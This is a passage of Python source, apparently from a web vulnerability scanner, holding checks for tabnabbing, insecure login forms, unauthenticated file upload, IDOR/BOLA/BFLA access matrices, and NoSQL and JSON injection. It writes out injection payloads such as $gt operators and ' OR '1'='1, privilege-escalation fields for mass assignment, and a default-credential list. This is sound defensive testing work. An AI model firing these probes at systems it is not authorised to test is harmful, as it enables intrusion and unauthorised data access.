    sess = re.findall(r'''(?:href|src|action)\s*=\s*["']([^"']*(?:jsessionid|phpsessid|sessionid|sid)=[A-Za-z0-9]{8,}[^"']*)["']''',
                      body, re.I)
    if sess:
        add(F("MEDIUM", 'Session token in URL',
              'A session ID in the URL leaks via server logs, Referer, and browser history — it can be used to hijack the session.',
              evidence=sess[0][:120], cwe="CWE-598",
              owasp="A07:2021 Identification & Authentication Failures", cvss=5.4,
              remed='Pass the session id only via an HttpOnly cookie; disable URL rewriting for sessions.',
              confidence="confirmed", location="/"))


def _rel_tokens(rel):
    return {t.lower() for t in re.split(r"\s+", rel or "") if t}


def _tabnab_is_vulnerable(target, rel, href, host):
    """Satu tautan rentan tabnabbing bila: target=_blank, href lintas-origin
    absolut/protocol-relative, dan rel tanpa noopener maupun noreferrer."""
    if (target or "").strip().lower() != "_blank":
        return False
    h = (href or "").strip()
    if not h or h.startswith(("#", "javascript:", "data:", "mailto:", "tel:")):
        return False
    low = h.lower()
    if low.startswith("//"):
        ext_host = urlparse("https:" + h).hostname
    elif low.startswith(("http://", "https://")):
        ext_host = urlparse(h).hostname
    else:
        return False  # tautan relatif = same-host, di bawah kendali pemilik
    if not ext_host or ext_host == host:
        return False
    toks = _rel_tokens(rel)
    return "noopener" not in toks and "noreferrer" not in toks


def _tabnab_links_in(body, host):
    """Daftar href rentan tabnabbing dalam satu body halaman.
    Parser BeautifulSoup bila tersedia, fallback regex (pola crawler.py)."""
    out = []
    try:
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(body or "", "html.parser")
        for a in soup.find_all("a"):
            href = a.get("href") or ""
            if _tabnab_is_vulnerable(a.get("target") or "", " ".join(a.get("rel") or []), href, host):
                out.append(href)
        return out
    except Exception:
        pass

    def _attr(tag, name):
        m = re.search(name + r'''\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))''', tag, re.I)
        return next((x for x in m.groups() if x is not None), "") if m else ""

    for tag in re.findall(r"<a\b[^>]*>", body or "", re.I):
        href = _attr(tag, "href")
        if _tabnab_is_vulnerable(_attr(tag, "target"), _attr(tag, "rel"), href, host):
            out.append(href)
    return out


def c_tabnabbing(ctx, add):
    """Reverse tabnabbing (Priority 1): tautan eksternal target=_blank tanpa
    rel=noopener/noreferrer di halaman-halaman hasil crawl (maks 10).
    Satu temuan teragregasi per scan."""
    surf = ctx.surface(full=True)
    pages = []
    home = surf.homepage or ctx.client.get("/")
    if home is not None and (home.body or ""):
        pages.append(("/", home.body))
    for p in list(surf.pages):
        if len(pages) >= 10 or ctx.cancelled():
            break
        path = p.split("?")[0]
        if path == "/" or any(pp == path for pp, _ in pages):
            continue
        r = ctx.client.get(p)
        if r.status == 200 and (r.body or ""):
            pages.append((path, r.body))
    total = 0
    examples = []
    for path, body in pages:
        if ctx.cancelled():
            return
        hits = _tabnab_links_in(body, ctx.client.host)
        if hits:
            ctx.L(f"  [tabnabbing] {path}: {len(hits)} vulnerable links")
            total += len(hits)
            for h in hits:
                if len(examples) < 5:
                    examples.append((path, h))
    if total:
        add(F("LOW", f"Reverse tabnabbing: {total} external target=_blank links without rel=noopener",
              'External links that open in a new tab (target=_blank) lack rel="noopener"/"noreferrer", so the opened page can reach window.opener and redirect this tab (e.g. to a phishing clone). Modern browsers (Chrome 88+, Firefox 79+, Safari) have applied rel=noopener implicitly for target=_blank links since around 2021, so this is not automatically exploitable in a current browser; the risk remains real for older browsers and embedded WebViews (mobile/desktop apps opening links), and the explicit rel attribute is the defense-in-depth fix. The confirmed claim is the presence of the markup pattern, proven in the served HTML.',
              evidence="; ".join(f"{p} -> {h}" for p, h in examples)[:300],
              cwe="CWE-1022", owasp="A05:2021 Security Misconfiguration", cvss=3.7,
              remed='Add rel="noopener noreferrer" to every external target="_blank" link; enforce it in the template/component that renders links.',
              confidence="confirmed", location=examples[0][0] if examples else "/"))


def c_auth_surface(ctx, add):
    """Permukaan autentikasi: form login via HTTP polos, autocomplete password,
    dan form upload? (upload di check tersendiri)."""
    surf = ctx.surface(full=True)
    for form in surf.forms:
        page_r = ctx.client.get(form["page"])
        has_pw = "password" in [i.lower() for i in form["inputs"]] or \
            re.search(r'type\s*=\s*["\']password', page_r.body or "", re.I)
        if not has_pw:
            continue
        if ctx.client.scheme == "http":
            add(F("HIGH", f"Login form/credentials sent over plain HTTP: {form['action']}",
                  'The page contains a password field but the target is accessed over HTTP without TLS — credentials can be intercepted on the network.',
                  evidence=f"form at {form['page']}, scheme=http", cwe="CWE-319",
                  owasp="A02:2021 Cryptographic Failures", cvss=7.4,
                  remed='Force HTTPS for the entire login flow (redirect + HSTS).',
                  confidence="confirmed", location=form["action"]))
        m = re.search(r'<input[^>]+type\s*=\s*["\']password["\'][^>]*>', page_r.body or "", re.I)
        if m and "autocomplete" not in m.group(0).lower():
            add(F("LOW", f"Password field without a proper autocomplete attribute: {form['action']}",
                  'Without autocomplete="current-password"/"new-password", browsers and password managers behave inconsistently (and legacy autofill may store credentials in unsafe places).',
                  evidence=m.group(0)[:120], cwe="CWE-525", owasp="A07:2021", cvss=3.1,
                  remed='Set the correct autocomplete on password fields.',
                  confidence="probable", location=form["action"]))
        break


def c_upload_surface(ctx, add):
    """Form upload file: deteksi, lalu (deep) coba unggah file teks benign bermarker
    dan cari apakah file itu dapat diakses kembali tanpa autentikasi."""
    surf = ctx.surface(full=True)
    home = surf.homepage or ctx.client.get("/")
    body = home.body or ""
    upload_forms = [(f, "multipart" in (f.get("enctype") or ""))
                    for f in surf.forms if f.get("has_file")]
    if not upload_forms and re.search(r'type\s*=\s*["\']file', body, re.I):
        upload_forms.append(({"action": "/", "page": "/"}, True))
    for form, is_multi in upload_forms[:1]:
        action = form["action"]
        add(F("MEDIUM", f"File upload form found: {action}",
              'A form with a file input is reachable. Ensure authentication, server-side type validation, antivirus scanning, and that files are stored outside the webroot / without execution.',
              evidence=f"page={form['page']} multipart={is_multi}", cwe="CWE-434",
              owasp="A01:2021 Broken Access Control", cvss=5.3,
              remed='Whitelist extensions + server-side MIME sniffing; store outside the webroot; use random names.',
              confidence="probable", location=action))
        # percobaan unggah benign (hanya membuktikan, tanpa muatan berbahaya)
        fname = f"ptk-{ctx.marker}.txt"
        content = f"PTK-UPLOAD-PROBE-{ctx.marker}"
        boundary = f"----PTK{ctx.marker}"
        mp = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
              f"filename=\"{fname}\"\r\nContent-Type: text/plain\r\n\r\n{content}\r\n"
              f"--{boundary}--\r\n")
        up = ctx.client.post(action, data=mp,
                             headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        candidates = [up.body or ""] + [ctx.client.get(p).body or "" for p in
                                        (f"/uploads/{fname}", f"/files/{fname}",
                                         f"/media/{fname}", f"/static/uploads/{fname}",
                                         f"/upload/{fname}")]
        if any(content in c for c in candidates):
            add(F("HIGH", f"File upload WITHOUT authentication confirmed: {action}",
                  'The probe text file was uploaded successfully and its contents can be accessed again without credentials — a classic path to a web shell if file types are not strictly validated.',
                  evidence=f"file {fname} served back with the probe marker",
                  cwe="CWE-434", owasp="A01:2021", cvss=8.6,
                  remed='Require upload authentication+authorization; whitelist types; store outside the webroot.',
                  confidence="confirmed", location=action))
        # ---- WS5 (v1.8.0): bypass verification with benign canary
        # markers ONLY (decision K3). No executable code is ever
        # uploaded — the verdict comes from the SERVING CONTEXT of an
        # inert marker file, never from code execution.
        def _up(fname2, part_ctype, content2, marker_s):
            b2 = f"----PTK{ctx.marker}B"
            mp2 = (f"--{b2}\r\nContent-Disposition: form-data; "
                   f"name=\"file\"; filename=\"{fname2}\"\r\n"
                   f"Content-Type: {part_ctype}\r\n\r\n{content2}\r\n"
                   f"--{b2}--\r\n")
            r = ctx.client.post(
                action, data=mp2,
                headers={"Content-Type":
                         f"multipart/form-data; boundary={b2}"})
            urls = []
            for murl in re.findall(r'(?:href|src)\s*=\s*["\']([^"\']+)',
                                   r.body or "", re.I):
                if fname2 in murl:
                    urls.append(urlparse(murl).path
                                if murl.startswith("http") else murl)
            for d in (f"/uploads/{fname2}", f"/files/{fname2}",
                      f"/media/{fname2}", f"/static/uploads/{fname2}",
                      f"/upload/{fname2}"):
                if d not in urls:
                    urls.append(d)
            for u in urls[:6]:
                g = ctx.client.get(u)
                if g.status == 200 and marker_s in (g.body or ""):
                    return u, g
            return None, None

        artifacts = []
        m_html = f"PTK-UPLOAD-MARKER-{ctx.marker}-HTML"
        u1, g1 = _up(f"ptk-{ctx.marker}.html", "text/plain",
                     f"<html><body>{m_html}</body></html>", m_html)
        if u1:
            artifacts.append(u1)
            served = (g1.hdr("content-type") or "").lower()
            if "text/html" in served:
                add(F("HIGH", f"Upload validation bypass: HTML marker file served as HTML: {action}",
                      'A benign HTML marker file, uploaded with a deliberately mismatched declared content type, is served back with Content-Type text/html — the same path stores attacker-controlled HTML/scripts (stored XSS / defacement primitive). The marker contains no executable code; the verdict is purely the serving context.',
                      evidence=f"{u1} retrievable with the canary marker, served as {served}",
                      cwe="CWE-434", owasp="A01:2021 Broken Access Control",
                      cvss=7.5,
                      remed='Validate extension AND sniffed content server-side; serve uploads with Content-Disposition: attachment and X-Content-Type-Options: nosniff, ideally from a separate origin.',
                      confidence="confirmed", location=action))
            else:
                add(F("MEDIUM", f"Upload accepts an HTML file (served inertly as {served or 'unknown'}): {action}",
                      'An HTML marker file passed upload validation but is served with a non-HTML content type, so it is not directly executable in a browser context. Validation still accepts content outside an image/document whitelist.',
                      evidence=f"{u1} retrievable with the canary marker, served as {served or 'unknown'}",
                      cwe="CWE-434", owasp="A01:2021 Broken Access Control",
                      cvss=5.3,
                      remed='Whitelist extensions and verify content signatures server-side.',
                      confidence="probable", location=action))
        m_gif = f"PTK-UPLOAD-MARKER-{ctx.marker}-GIF"
        u2, _g2 = _up(f"ptk-{ctx.marker}.gif", "image/gif",
                      "GIF89a;" + m_gif, m_gif)
        if u2:
            artifacts.append(u2)
            add(F("MEDIUM", f"Upload polyglot/mismatch file publicly reachable: {action}",
                  'A GIF-header polyglot marker file (declared image/gif; the body after the header is plain marker text) was accepted and is publicly retrievable — header/extension checks alone are not stopping non-image content.',
                  evidence=f"{u2} retrievable with the canary marker",
                  cwe="CWE-434", owasp="A01:2021 Broken Access Control",
                  cvss=5.3,
                  remed='Re-encode images server-side; verify full content signatures, not just magic bytes.',
                  confidence="probable", location=action))
        # Cleanup attempt: delete what the endpoint lets us delete;
        # whatever remains is recorded as a test artifact in the scan
        # metadata (and the log), never silently left undocumented.
        left = []
        for u in artifacts:
            try:
                ctx.client.request("DELETE", u)
            except Exception:
                pass
            g = ctx.client.get(u + "?ptkdel=1")
            if g.status == 200 and ctx.marker in (g.body or ""):
                left.append(u)
        if left:
            ctx.check_meta.setdefault("upload_artifacts", []).extend(left)
            ctx.L(f"  [upload] {len(left)} benign test artifact(s) could "
                  f"not be deleted and remain at: {', '.join(left)}")


SERIAL_SIGNS = [
    (r"rO0ABXNy|aced0005", "Java serialized object (Base64/hex)", "CWE-502"),
    (r"O:\d+:\"[^\"]+\":\d+:\{", "PHP serialized object", "CWE-502"),
    (r"__VIEWSTATE", "ASP.NET ViewState", "CWE-502"),
    (r"AAEAAAD/////", ".NET BinaryFormatter/LosFormatter blob", "CWE-502"),
]


def c_deserialization_surface(ctx, add):
    surf = ctx.surface(full=False)
    home = surf.homepage or ctx.client.get("/")
    corpus = (home.body or "") + " ".join(home.hdr_all("set-cookie"))
    for pat, label, cwe in SERIAL_SIGNS:
        if re.search(pat, corpus):
            add(F("LOW", f"Serialized data detected: {label}",
                  'A serialized data pattern appears in the page/cookie. Deserializing untrusted data is a classic source of RCE — ensure input is never deserialized without integrity verification (MAC/signature).',
                  evidence=f"pattern {label}", cwe=cwe,
                  owasp="A08:2021 Software & Data Integrity Failures", cvss=3.7,
                  remed='Avoid native deserialization for client data; use JSON + signatures.',
                  confidence="candidate", location="/"))
            return


def c_security_txt_robots(ctx, add):
    r = ctx.client.get("/.well-known/security.txt")
    if r.status == 404 or ctx.is_missing(r):
        r2 = ctx.client.get("/security.txt")
        if r2.status == 404 or ctx.is_missing(r2):
            add(F("INFO", 'security.txt not found',
                  'Without /.well-known/security.txt, security researchers have difficulty finding the official vulnerability reporting channel (RFC 9116).',
                  cwe="CWE-1059", owasp="A05:2021", cvss=0.0,
                  remed='Publish a security.txt containing contact details and a disclosure policy.',
                  confidence="confirmed", location="/.well-known/security.txt"))
    surf = ctx.surface(full=False)
    dis = getattr(surf, "robots_paths", []) if surf else []
    interesting = [p for p in dis if any(k in p.lower() for k in
                   ("admin", "backup", "private", "internal", "config", "secret", ".git"))]
    if interesting:
        add(F("LOW", 'robots.txt discloses sensitive paths',
              'Disallow entry points to a sensitive area: ' + ", ".join(interesting[:5]) +
              " — robots.txt can be read by anyone and becomes the attacker's initial map.",
              evidence=", ".join(interesting[:5]), cwe="CWE-200", owasp="A05:2021",
              cvss=3.1, remed='Do not rely on robots.txt to hide paths; protect them at the server.',
              confidence="confirmed", location="/robots.txt"))


SENSITIVE_JSON_KEYS = ["password", "passwd", "password_hash", "credit_card", "card_number",
                       "cvv", "ssn", "secret", "api_key", "apikey", "access_token",
                       "private_key", "otp", "pin"]


def c_api_sensitive_data(ctx, add):
    """Endpoint API yang dapat diakses TANPA autentikasi dan memuat data sensitif/PII."""
    surf = ctx.surface(full=True)
    endpoints = list(dict.fromkeys(
        [e for e in surf.js_endpoints] +
        [p.split("?")[0] for p in surf.param_urls if p.startswith("/api")]))[:6]
    email_re = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
    for ep in endpoints:
        r = ctx.client.get(ep)
        if r.status != 200 or not r.body or ctx.is_missing(r):
            continue
        low = r.body.lower()
        keys = [k for k in SENSITIVE_JSON_KEYS if f'"{k}"' in low]
        emails = email_re.findall(r.body)
        if keys:
            add(F("HIGH", f"Unauthenticated API leaks sensitive fields: {ep}",
                  f"The public response contains fields: {', '.join(keys[:5])}. This API can be accessed without any credentials from the scan session.",
                  evidence=f"keys={keys[:5]}", cwe="CWE-200",
                  owasp="A01:2021 Broken Access Control (API3: Excessive Data Exposure)", cvss=7.5,
                  remed='Require authentication+authorization per object; filter response fields on the server (DTO).',
                  confidence="confirmed", location=ep))
        elif len(emails) >= 2:
            add(F("MEDIUM", f"Unauthenticated API leaks email addresses: {ep}",
                  f"{len(emails)} email addresses found in a public response without authentication.",
                  evidence=f"contoh: {emails[0][:40]}…", cwe="CWE-359",
                  owasp="A01:2021 (API3: Excessive Data Exposure)", cvss=5.3,
                  remed='Restrict PII data to authenticated data owners only.',
                  confidence="confirmed", location=ep))


def c_broken_access_idor(ctx, add):
    """IDOR/BOLA indikator: parameter ID numerik — objek tetangga dapat diakses tanpa
    autentikasi dan memuat data yang BERBEDA (dilabeli probable: konteks kepemilikan
    tetap wajib diverifikasi manual dengan dua akun uji)."""
    for base, pname, method, orig in ctx.param_targets(limit=14):
        if method != "GET":
            continue
        orig_val = None
        if orig and "?" in orig:
            for pair in orig.split("?", 1)[1].split("&"):
                if pair.startswith(pname + "="):
                    orig_val = pair.split("=", 1)[1]
        if not orig_val or not orig_val.isdigit():
            continue
        n = int(orig_val)
        r1 = ctx.req_param(base, pname, str(n), method, orig)
        r2 = ctx.req_param(base, pname, str(n + 1), method, orig)
        if r1.status == 200 and r2.status == 200 and r1.body and r2.body \
                and not ctx.is_missing(r2):
            sim = similarity(r1.body, r2.body)
            has_data = re.search(r"@|user|nama|name|email|order|account", r2.body, re.I)
            if sim < 0.85 and has_data:
                add(F("HIGH", f"IDOR/BOLA indication: {base} param '{pname}'",
                      f"Object {pname}={n} and {pname}={n + 1} are both accessible WITHOUT authentication and their contents differ — a classic broken object level authorization pattern. Manual verification with 2 test accounts remains mandatory to confirm that data really is mixed between users.",
                      evidence=f"sim({n},{n+1})={sim:.2f}, keduanya HTTP 200",
                      cwe="CWE-639", owasp="A01:2021 Broken Access Control (API1: BOLA)",
                      cvss=7.5, remed='Check object ownership on the server on EVERY request.',
                      confidence="probable", location=base, param=pname))
                return


def c_nosql_api(ctx, add):
    """NoSQL injection di endpoint API JSON: operator $gt mengubah [] menjadi data."""
    surf = ctx.surface(full=True)
    endpoints = list(dict.fromkeys(
        [e for e in surf.js_endpoints if e.startswith("/api")]))
    # Prioritaskan endpoint mirip pencarian (permukaan NoSQL alami);
    # daftar endpoint terurut alfabetis (determinisme v1.8) — cap buta
    # bisa menggeser endpoint target keluar daftar (regresi v1.10).
    endpoints.sort(key=lambda e: (0 if any(k in e.lower() for k in
                     ("search", "query", "find", "lookup", "filter"))
                     else 1, e))
    endpoints = endpoints[:8]
    for ep in endpoints:
        hdr = {"Content-Type": "application/json"}
        bad = ctx.client.post(ep, data='{"q": "ptk-invalid-zzz"}', headers=hdr)
        for payload in ['{"q": {"$gt": ""}}', '{"id": {"$gt": 0}}', '{"q": {"$ne": null}}']:
            r = ctx.client.post(ep, data=payload, headers=hdr)
            if r.status == 200 and r.body and len(r.body) > 60 \
                    and (bad.status != 200 or len(r.body) > len(bad.body or "") * 2 + 40) \
                    and re.search(r'"(id|name|email|user)"', r.body):
                add(F("HIGH", f"NoSQL Injection in API: {ep}",
                      'A JSON query with MongoDB operators ($gt/$ne) returned data, while an invalid value did not — JSON input is passed through to the NoSQL query.',
                      evidence=f"payload={payload} -> {len(r.body)} byte data",
                      cwe="CWE-943", owasp="A03:2021 Injection (API8)", cvss=8.6,
                      remed='Validate input types (strings only); reject keys starting with $ or containing dots.',
                      confidence="probable", location=ep))
                return


_ID_SEG = re.compile(r"/(\d{2,}|[0-9a-fA-F]{8}-[0-9a-fA-F-]{27,})(/|$)")


def c_bola_matrix(ctx, add):
    """Dual-account BOLA matrix (Fase 4): URL ber-ID objek yang terbaca oleh
    akun A diputar ulang dengan kredensial akun B dan tanpa auth. Confirmed
    hanya bila B membaca objek A (kemiripan konten tinggi) sementara akses
    anonim ditolak — pola bukti tiga arah, bukan tebakan satu respons."""
    auth_b = ctx.opts.get("auth_b") or {}
    if not auth_b:
        ctx.L("  [bola] single-account scan — dual-account BOLA matrix "
              "skipped (needs a second credential)")
        return
    from netclient import Client as _Client
    b_client = _Client(ctx.target, timeout=ctx.client.timeout,
                       extra_headers=auth_b.get("headers") or {},
                       cookie=auth_b.get("cookie", ""))
    b_client.proxy = ctx.client.proxy
    anon = _Client(ctx.target, timeout=ctx.client.timeout)
    anon.proxy = ctx.client.proxy
    surf = ctx.surface(full=True)
    cands, seen = [], set()
    for url in list(surf.pages) + list(surf.param_urls) + \
            [f["action"] for f in surf.forms]:
        path = url.split("?")[0]
        if _ID_SEG.search(path) and path not in seen:
            seen.add(path)
            cands.append(url)
    ctx.L(f"  [bola] {len(cands)} object-URL candidates for cross-account replay")
    checked = 0
    for url in cands[:12]:
        if ctx.cancelled():
            return
        ra = ctx.client.get(url)
        if ra.status != 200 or not ra.body or len(ra.body) < 40 \
                or ctx.is_missing(ra):
            continue
        checked += 1
        rn = anon.get(url)
        if rn.status == 200 and rn.body and \
                similarity(rn.body, ra.body) >= 0.85:
            continue                      # objek publik — bukan BOLA
        rb = b_client.get(url)
        if rb.status == 200 and rb.body and \
                similarity(rb.body, ra.body) >= 0.85:
            m = re.search(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}",
                          ra.body)
            marker = m.group(0)[:60] if m else (ra.body[:60].replace("\n", " "))
            add(F("HIGH", f"BOLA: cross-account object access: {url}",
                  "Account B's credentials read an object that account A accessed, while unauthenticated access is denied — object-level authorization is not enforced per owner (Broken Object Level Authorization).",
                  evidence=f"A=200, B=200 (similarity {similarity(rb.body, ra.body):.2f}), anonymous={rn.status}; A-object marker: {marker}",
                  cwe="CWE-639", owasp="A01:2021 Broken Access Control (API1: BOLA)",
                  cvss=8.1,
                  remed="Authorize every object access against the authenticated owner's scope on the server; never rely on unguessable IDs.",
                  confidence="confirmed", location=url))
    ctx.L(f"  [bola] replayed {checked} readable object URLs across accounts")


_BFLA_PATH_RE = re.compile(
    r"(admin|manage|settings|users|roles|permissions|console|internal|"
    r"moderator|backoffice)", re.I)
_BFLA_KNOWN = ["/admin", "/admin/users", "/api/admin/users",
               "/api/admin", "/manage", "/management/users"]


def _bfla_access(resp, ctx):
    """Classify one response to a privileged-function request:
    "granted" (real content served), "denied" (authentication wall),
    "other" (missing/error — no authorization signal either way)."""
    if resp is None or not resp.status:
        return "other"
    if resp.status in (401, 403):
        return "denied"
    if 300 <= resp.status < 400:
        loc = resp.hdr("location").lower()
        return "denied" if ("login" in loc or "signin" in loc
                            or "auth" in loc) else "other"
    if resp.status != 200 or not resp.body or ctx.is_missing(resp):
        return "other"
    low = resp.body.lower()
    if 'type="password"' in low and ("sign in" in low or "log in" in low
                                     or "login" in low):
        return "denied"          # login wall served with HTTP 200
    return "granted"


def c_bfla_matrix(ctx, add):
    """WS3 (v1.8.0): Broken Function Level Authorization matrix.
    Privileged-function endpoints (crawl surface + a short known list)
    are replayed with the primary session, a second credential set
    (opts auth_b, the BOLA infrastructure) and anonymously. Confirmed
    needs the full three-way pattern: the second identity reads
    content equivalent to the primary session WHILE anonymous access
    is denied — an anonymous-equivalent result is a public page, not
    a finding. The full matrix (including healthy rows) is recorded
    in the scan metadata. Without a second credential set the matrix
    is partial (primary vs anonymous) and says so."""
    from netclient import Client as _Client
    surf = ctx.surface(full=True)
    cands, seen = [], set()
    for p in ([x.split("?")[0] for x in surf.pages]
              + [x.split("?")[0] for x in surf.param_urls]
              + [f["action"] for f in surf.forms] + _BFLA_KNOWN):
        if p and p not in seen and _BFLA_PATH_RE.search(p):
            seen.add(p)
            cands.append(p)
    auth_b = ctx.opts.get("auth_b") or {}
    second = None
    if auth_b:
        second = _Client(ctx.target, timeout=ctx.client.timeout,
                         extra_headers=auth_b.get("headers") or {},
                         cookie=auth_b.get("cookie", ""))
        second.proxy = ctx.client.proxy
    anon = _Client(ctx.target, timeout=ctx.client.timeout)
    anon.proxy = ctx.client.proxy
    rows = []
    for path in cands[:12]:
        if ctx.cancelled():
            break
        rp = ctx.client.get(path)
        vp = _bfla_access(rp, ctx)
        row = {"function": path, "primary_status": rp.status,
               "primary": vp, "second_status": None, "second": None,
               "anonymous_status": None, "anonymous": None,
               "verdict": "not reachable by the primary session"}
        if vp == "granted":
            ra = anon.get(path)
            va = _bfla_access(ra, ctx)
            row["anonymous_status"], row["anonymous"] = ra.status, va
            rb = second.get(path) if second else None
            if rb is not None:
                row["second_status"] = rb.status
                row["second"] = _bfla_access(rb, ctx)
            sim_a = similarity(ra.body, rp.body) if va == "granted" else 0.0
            sim_b = similarity(rb.body, rp.body) \
                if (rb is not None and row["second"] == "granted") else 0.0
            if row["second"] == "granted" and sim_b >= 0.85 \
                    and va == "denied":
                row["verdict"] = ("BFLA: second identity granted with "
                                  "equivalent content, anonymous denied")
                add(F("HIGH", f"BFLA: privileged function accessible to a low-privilege account: {path}",
                      'The function answers the second (low-privilege) credential set with content equivalent to the primary session, while unauthenticated access is denied — function-level authorization is not enforced per role (Broken Function Level Authorization).',
                      evidence=f"primary=200 granted, second=200 (similarity {sim_b:.2f}), anonymous={ra.status} denied",
                      cwe="CWE-862", owasp="A01:2021 Broken Access Control (API5: BFLA)",
                      cvss=8.1,
                      remed="Authorize every privileged function against the caller's role on the server, not just the object's owner.",
                      confidence="confirmed", location=path))
            elif va == "granted" and sim_a >= 0.85:
                row["verdict"] = ("publicly reachable: anonymous content "
                                  "is equivalent — not an authorization "
                                  "finding")
            elif va == "granted" and row["second"] == "granted" \
                    and sim_b >= 0.85:
                row["verdict"] = ("second identity equivalent, but "
                                  "anonymous is granted too — treated "
                                  "as public, not confirmed")
            elif va == "granted":
                row["verdict"] = ("anonymous granted with different "
                                  "content than the primary session")
                add(F("MEDIUM", f"Privileged function reachable without authentication: {path}",
                      'An unauthenticated request is granted a response at a privileged-function path. Its content differs from the authenticated session view, so this is reported as probable — verify whether the anonymous view exposes privileged data or actions.',
                      evidence=f"primary=200 granted, anonymous=200 granted (similarity {sim_a:.2f})",
                      cwe="CWE-862", owasp="A01:2021 Broken Access Control (API5: BFLA)",
                      cvss=6.5,
                      remed="Require authentication and role authorization on privileged functions.",
                      confidence="probable", location=path))
            else:
                row["verdict"] = ("healthy: only authenticated sessions "
                                  "are granted")
        rows.append(row)
    if not auth_b:
        ctx.L("  [bfla] second credential set not supplied — the "
              "function matrix is partial (primary vs anonymous only); "
              "cross-account BFLA is not evaluated")
    ctx.check_meta["bfla_matrix"] = rows
    ctx.L(f"  [bfla] matrix recorded for {len(rows)} "
          "privileged-function candidate(s)")


_PRIV_FIELDS = {"role": "admin", "is_admin": True, "isAdmin": True,
                "admin": True, "verified": True, "balance": 1000000,
                "account_type": "admin"}


def _json_seed_bodies(ctx, ep):
    """Bangun body JSON benih untuk satu endpoint dari sinyal crawl:
    nama field form pada action yang sama > pola login > generik."""
    seeds = []
    low = ep.lower()
    for form in ctx.surface().forms:
        if form.get("action") == ep and form.get("inputs"):
            seeds.append({n: "ptk" for n in form["inputs"][:6]})
            break
    if any(k in low for k in ("login", "auth", "signin", "token", "session")):
        seeds.append({"username": "ptk_user", "password": "ptk_pass"})
        seeds.append({"email": "ptk@example.invalid", "password": "ptk_pass"})
    seeds.append({"id": 1, "q": "ptk", "name": "ptk"})
    out, seen = [], set()
    for sd in seeds:
        k = json.dumps(sd, sort_keys=True)
        if k not in seen:
            seen.add(k)
            out.append(sd)
    return out[:3]


def c_json_fuzz(ctx, add):
    """Fuzzing JSON/REST terstruktur (Fase 4) — melampaui c_nosql_api
    (operator datar): (1) mass assignment field privilegi, (2) type
    confusion per field, (3) injeksi bersarang (objek/array satu level).
    Semua klaim berbasis bukti respons yang terukur terhadap baseline
    endpoint yang sama; tidak ada klaim dari satu anomali status saja."""
    surf = ctx.surface(full=True)
    endpoints = list(dict.fromkeys(
        [e for e in surf.js_endpoints if e.startswith("/api")] +
        [f["action"] for f in surf.forms
         if f.get("method", "GET").upper() == "POST"] +
        [p.split("?")[0] for p in surf.param_urls
         if p.startswith("/api")]))[:6]
    hdr = {"Content-Type": "application/json"}
    for ep in endpoints:
        if ctx.cancelled():
            return
        for seed in _json_seed_bodies(ctx, ep):
            base = ctx.client.post(ep, data=json.dumps(seed), headers=hdr)
            if base.status == 0 or ctx.is_missing(base):
                break
            base_low = (base.body or "").lower()
            # --- (1) mass assignment -------------------------------------
            ma = dict(seed)
            ma.update(_PRIV_FIELDS)
            r = ctx.client.post(ep, data=json.dumps(ma), headers=hdr)
            if r.status in (200, 201) and r.body:
                echoed = [k for k, v in _PRIV_FIELDS.items()
                          if f'"{k}"' in r.body
                          and json.dumps(v) in r.body.replace(" ", "")]
                new_echo = [k for k in echoed
                            if f'"{k}"' not in (base.body or "")]
                if new_echo:
                    add(F("HIGH", f"Mass assignment in JSON API: {ep}",
                          f"The endpoint accepts and reflects privileged fields it should never take from clients: {', '.join(new_echo[:4])}. Submitting them in the request body is reflected in the response — server-side authorization fields are client-controllable.",
                          evidence=f"injected fields reflected: {new_echo[:4]} (status {r.status})",
                          cwe="CWE-915", owasp="A01:2021 Broken Access Control (API6: Mass Assignment)",
                          cvss=8.1,
                          remed="Bind request bodies to an explicit DTO/allowlist of client-settable fields; never bind persistence models directly.",
                          confidence="confirmed", location=ep))
            # --- (2)+(3) per-field: type confusion + nested injection ---
            for field in [k for k, v in seed.items() if isinstance(v, str)][:3]:
                variants = [
                    ("type-confusion array", [seed[field]]),
                    ("type-confusion object", {"v": seed[field]}),
                    ("nested SQLi", {"nested": "' OR '1'='1"}),
                    ("nested SQLi (array)", ["' OR '1'='1"]),
                ]
                for label, val in variants:
                    mut = dict(seed)
                    mut[field] = val
                    r = ctx.client.post(ep, data=json.dumps(mut), headers=hdr)
                    if not r.body:
                        continue
                    low = r.body.lower()
                    new_errs = [e for e in SQL_ERRORS
                                if e in low and e not in base_low]
                    if new_errs and r.status != base.status:
                        add(F("HIGH", f"Injection via JSON {label}: {ep} field '{field}'",
                              f"A structured mutation ({label}) of field '{field}' triggers database error signatures absent from the baseline response — the API passes nested/typed JSON values into its query layer unsanitized.",
                              evidence=f"error signature: {new_errs[0][:60]}",
                              cwe="CWE-89", owasp="A03:2021 Injection", cvss=8.6,
                              remed="Validate JSON field types strictly server-side; use parameterized queries; reject nested objects where scalars are expected.",
                              confidence="probable", location=ep, param=field))
                        break
            # satu seed per endpoint cukup untuk fuzz terstruktur
            break


DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "1234"),
                 ("tomcat", "tomcat"), ("root", "root"), ("admin", "admin123"),
                 ("user", "user"), ("guest", "guest")]



_VERIFY_HDR = {"X-Requested-With": "VanthexVerify"}


def c_stored_xss(ctx, add):
    """Stored XSS (WS2 v1.4.0): plant a marker-sandwich payload into
    non-auth POST forms, then prove it on a FRESH GET of a retrieval
    page with a BASELINE DIFF — the payload occurrence count after
    planting must exceed the count captured BEFORE planting (a page
    that already contained the payload proves nothing), AND the parsed
    DOM must show the marker in an executable position (xssverify);
    increased-but-inert renderings are probable 'position not
    confirmed'. The POST response itself never counts (that would be
    reflected, not stored). The soft-404 gate keeps this check inert
    on SPA catch-alls (the v3.2 regression must not recur)."""
    surf = ctx.surface(full=True)
    forms = [f for f in surf.forms
             if (f.get("method") or "GET").upper() == "POST"]
    # Halaman form umum yang mungkin tidak terjangkau crawl terbatas
    # di-probe langsung (pola yang sama dengan daftar path terkurasi di
    # check lain). Gerbang is_missing membuat probe ini mati di SPA
    # catch-all: shell soft-404 tidak pernah di-parse form-nya.
    _known = {(f.get("action"), f.get("page")) for f in forms}
    for _pg in ("/guestbook", "/comments", "/comment", "/feedback",
